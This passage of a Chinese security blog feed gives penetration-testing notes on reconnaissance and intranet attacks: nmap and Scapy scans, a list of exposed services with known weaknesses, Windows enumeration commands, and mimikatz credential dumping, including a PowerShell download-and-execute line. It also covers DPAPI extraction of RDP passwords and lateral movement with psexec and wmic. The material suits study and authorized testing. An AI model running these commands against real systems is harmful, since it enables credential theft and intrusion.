class="line">OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%</span><br><span class="line">OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=</span><br><span class="line">OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</span><br><span class="line">OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Uptime guess: 22.103 days (since Fri Mar 19 11:30:10 2021)</span><br><span class="line">Network Distance: 0 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.35 seconds</span><br><span class="line">           Raw packets sent: 65645 (2.892MB) | Rcvd: 131283 (5.520MB)</span><br></pre></td></tr></table></figure><ul><li><h4 id="御剑端口扫描">御剑端口扫描</h4></li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210410140753.png" alt="image-20210410140746650"></p><h3 id="公开漏洞库利用">公开漏洞库利用</h3><ul><li><h4 id="白阁文库"><a href="https://wiki.bylibrary.cn/">白阁文库</a></h4></li></ul><h3 id="SCAPY-网络信息">SCAPY 网络信息</h3><p>使用SCAPY创立发送数据包<br>pkt=IP(src=“192.168.0.7” ,dst=“39.156.69.79”)/TCP()<br>●res=sr1(pkt) /接收res. summary() //查看<br>●sr() /接受全部.<br>●send() //只发送.<br>发送两层数据包<br>●srp()<br>●srp1()<br>●sendp()</p><h5 id="发送tcp数据包">发送tcp数据包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ip=IP()</span><br><span class="line">tcp=TCP()</span><br><span class="line">ip.dst=<span class="string">&quot;192.168.0.6&quot;</span></span><br><span class="line">ip.dport=445</span><br><span class="line">tcp.flags=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">sr1(ip)</span><br><span class="line">sr1(IP(dst=<span class="string">&quot;www.baidu.com&quot;</span>)/TCP(dport=[21,80,3389],flags=<span class="string">&#x27;A&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="被动信息搜集">被动信息搜集</h2><h3 id="谷歌语法">谷歌语法</h3><p><a href="https://www.exploit-db.com/google-hacking-database">谷歌语法数据库</a></p><h3 id="旁站搜集">旁站搜集</h3><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h3 id="dig">dig</h3><p>dig可以查询到域名dns记录,对此可以查询到对应ip 参数+trance可以进行跟踪</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀B)-[~]</span><br><span class="line">└─<span class="comment"># dig dansemal.cn</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.17.21-1-Debian &lt;&lt;&gt;&gt; dansemal.cn</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 49678</span></span><br><span class="line"><span class="string">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 1024</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;dansemal.cn.                   IN      A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; AUTHORITY SECTION:</span></span><br><span class="line"><span class="string">dansemal.cn.            3600    IN      SOA     ns3.dnsv4.com. enterprise2dnsadmin.dnspod.com. 1639057957 3600 180 1209600 180</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; Query time: 76 msec</span></span><br><span class="line"><span class="string">;; SERVER: 192.168.0.2#53(192.168.0.2) (UDP)</span></span><br><span class="line"><span class="string">;; WHEN: Mon Jan 10 18:47:49 CST 2022</span></span><br><span class="line"><span class="string">;; MSG SIZE  rcvd: 116</span></span><br></pre></td></tr></table></figure><h3 id="span-id-指纹信息-指纹信息-span"><span id="指纹信息">指纹信息</span></h3><ul><li><p>wappalyzer(浏览器插件)</p></li><li><p><a href="https://yunsee.cn">云悉</a></p></li><li><p>御剑web指纹扫描工具</p></li><li><p><a href="http://whatweb.bugscaner.com/look/">在线cms识别</a></p></li><li></li></ul><h2 id="信息泄露搜集">信息泄露搜集</h2><h3 id="SVN信息泄露">SVN信息泄露</h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1641382016-94f9c29fd01aca546c2d79388d756d28.webp" alt="image-20220105192643897"></p><h3 id="文件泄露">文件泄露</h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1641382115-dc1428e5981a2be047309f1c61709ce4.webp" alt="image-20220105192830602"></p><h3 id="git泄露">git泄露</h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1641382458-143428c6fc9a0b2237d34a9d45cb34e5.webp" alt="image-20220105193415382"></p><h3 id="robots-txt泄露">robots.txt泄露</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀B)-[~]</span><br><span class="line">└─<span class="comment"># curl www.dansemal.cn/robots.txt</span></span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line"></span><br><span class="line">Sitemap: https://www.dansemal.cn/sitemap.xml</span><br></pre></td></tr></table></figure><h2 id="危险端口搜集">危险端口搜集</h2><h3 id="web类-web漏洞-敏感目录">web类(web漏洞/敏感目录)</h3><p>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix<br>80 web<br>80-89 web<br>8000-9090 web</p><h3 id="数据库类-扫描弱口令">数据库类(扫描弱口令)</h3><p>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL</p><h3 id="特殊服务类-未授权-命令执行类-漏洞">特殊服务类(未授权/命令执行类/漏洞)</h3><p>443 SSL心脏滴血<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p><h3 id="常用端口类-扫描弱口令-端口爆破">常用端口类(扫描弱口令/端口爆破)</h3><p>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面</p><h3 id="端口合计详情">端口合计详情</h3><p>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB</p><p>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p><h2 id="内网信息收集">内网信息收集</h2><h3 id="内网信息收集的概念">内网信息收集的概念</h3><p>内网是分布在一个区域性的网络，也称之为局域网，针对于内网不公开于互联网之上，内网分<br>为好几种类型，有服务器内网、办公区域内网等等，内网可以方便的传输，以及可以保证其数<br>据的安全，其资产不亚于暴露外网的资产多，内网信息收集也是非常重要的。</p><p>作为红队来讲，突破内网的前提下就是针对于内网的信息收集，内网的资产分布式很广-，不仅<br>是WEB，甚至开放了各种危险端口，在内网中机器不保证其开防火墙，所以我们可以任由横<br>穿,假设内网机器大量没有打补J的ms17010漏洞，我们就可以横穿其内网了。</p><p>再一方面， 即使内网很安全，当我们收集到密码之后去撞库，测试一下密码是否被重复使用,<br>也可以实现攻破其他主机。</p><ul><li>内网信息搜集隐蔽</li></ul><p>在收集内网信息的前提下，我们需要针对管理员的登录时间进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">net user administrator //查看最后登录时间</span><br><span class="line">wevtutil epl security C:\System_log.evtx //保存所有日志信息  </span><br><span class="line"></span><br><span class="line">ipconfig /all   查询本机IP信息是否多网卡</span><br><span class="line">net user    查看本机有几个账户</span><br><span class="line">query user    查看在线的用户</span><br><span class="line">tasklist /v    显示所有运行的进程</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;  查询系统版本</span><br><span class="line">systeminfo    查看补丁信息</span><br><span class="line">net share    查看共享信息</span><br><span class="line">netsh firewall show config查看防火墙信息</span><br><span class="line">net statistics workstation查看开机时间</span><br><span class="line">wmic product get name,version查看安装软件</span><br><span class="line">net session查看会话</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f开启远程RDP</span><br><span class="line">net config workstation    查看是否存在域环境</span><br><span class="line">wlan show profiles   查看连接过的WiFi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh</span><br><span class="line">wlan</span><br><span class="line">show profiles</span><br><span class="line">show profiles name=&quot;&quot; key=clear 显示密码</span><br><span class="line"></span><br><span class="line">rdp连接记录</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">内网主机提权</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">复制信息到 https://i.hacking8.com/tiquan</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="内网主机探测及扫描">内网主机探测及扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">内网穿透-流量代理</span><br><span class="line"></span><br><span class="line">● 流量代理出网是将目标机器的内网代理出本机，之后再进行扫描，- -般代理出网的代理大部分都是</span><br><span class="line">socks5、socks4, 流量代理的工具有很多，个人感觉最好的还是Frp比较稳定。</span><br><span class="line">● 内网流量转发</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">内网区域大小探测</span><br><span class="line">●我们可以通过arp /a来观察网段的总体情况</span><br><span class="line">●私有IP地址有10段、172段、 192段, 大小从大到小排序的</span><br><span class="line">●A类地址</span><br><span class="line">10.0.0.0--10.255.255.255</span><br><span class="line">●B类地址</span><br><span class="line">172.16.0.0--172.31.255.255</span><br><span class="line">●C类地址</span><br><span class="line">192.168.0.0--192.168.255.255</span><br><span class="line"></span><br><span class="line">内网主机存活检测</span><br><span class="line">使用ping 或nmap</span><br><span class="line">当流量代理出来 可以使用proxychains 去调用nmap进行对目标内网进行扫描</span><br><span class="line"></span><br><span class="line">NTscan</span><br><span class="line">进行内网爆破</span><br><span class="line"></span><br><span class="line">内网弱口令</span><br><span class="line">备忘脆弱性资产</span><br><span class="line">内网流量嗅探</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="内网主机密码搜集">内网主机密码搜集</h3><h4 id="mimikatz抓取本机密码">mimikatz抓取本机密码</h4><p>mimikatz是一 款简单且好用的windows密码抓取神器,该软件可帮助用户-键抓取window密<br>码，操作简单、使用方便。<br>在域渗透过程中另外一名老师会为大家讲解mimikatz的一-些高级使用，这里只做简单介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege:debug&quot; &quot;sekurlsa:logonpasswords&quot; exit读取本机密码</span><br><span class="line"></span><br><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;  &#x27;);Invoke-Mimikatz -DumpCreds&quot; //powershell方式</span><br><span class="line"></span><br><span class="line">powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz</span><br></pre></td></tr></table></figure><ul><li>lazagne抓取密码</li><li><a href="https://github.com/dzxs/Xdecrypt">xshell密码抓取</a></li><li><a href="https://github.com/uknowsec/SharpDecryptPwd">sharpdecryptpwd密码抓取工具</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mimikatz获取rdp连接记录密码</span><br><span class="line"></span><br><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">privilege::debug</span><br><span class="line">dpapi:cred /in:C:\Users\A\AppData\Local\Microsoft\Credentials\CA881006071CB1238C13640450A5B676</span><br><span class="line">寻找GuiMasterKey</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line">dpapi:cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58</span><br><span class="line">/masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d</span><br></pre></td></tr></table></figure><h3 id="内网横向">内网横向</h3><h4 id="IPC空连接概述">IPC空连接概述</h4><p>IPC(Internet Process Connection)是共享&quot;命名管道&quot;的资源。</p><p>它是为了让进程间通信而开放的命名管道,通过提供可信任的用户名和口令，连接建<br>立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><p>IPC是NT/2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个<br>连接。NT/2000在提供了ipc功能的同时，在初次安装系统时还打开了默认共享，即所有的逻<br>辑共享(.,…和系统自录winnt或windows(admin)共享。所有的这些，微软的初衷都是为<br>了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p><h4 id="建立空连接命令">建立空连接命令</h4><p><code>net share      查看本机共享</code><br><code>net use \\IP地址&quot;密码&quot; /user:用户名     对其进行空连接</code><br><code>net use \\IP地址/del  删除空连接</code><br><code>net time \\IP地址     查看机器时间</code></p><h4 id="psexec-横向工具">psexec 横向工具</h4><p>微软提供的一种远程命令行工具<br>可直接用于对远程主机进行命令交互<br><code>psexec.exe -accepteula \\IP -u domain\administrator -p password command</code></p><h4 id="wmic横向">wmic横向</h4><p>wmic是一 款Windows自带的工具集，<br><code>wmic /node: 192.168.200.10 /user:jack /password:a #连接后面拼接wmic命令</code><br><code>process call create“cmd.exe&quot; #启动某一程序</code></p><p><code>process list brief #查看所有进程</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息搜集概念&quot;&gt;信息搜集概念&lt;/h2&gt;
&lt;mark class=&quot;hl-label blue&quot;&gt;信息收集是指黑客为了更加有效地实施渗透攻击而在攻击前或攻击过程中对目标的所有探测活动&lt;/mark&gt; 
&lt;h3 id=&quot;搜集什么信息&quot;&gt;搜集什么信息&lt;/h3&gt;
&lt;ul&gt;
</summary>
      
    
    
    
    <category term="信息搜集" scheme="https://www.dansemal.cn/categories/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
    <category term="信息搜集" scheme="https://www.dansemal.cn/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
</feed>
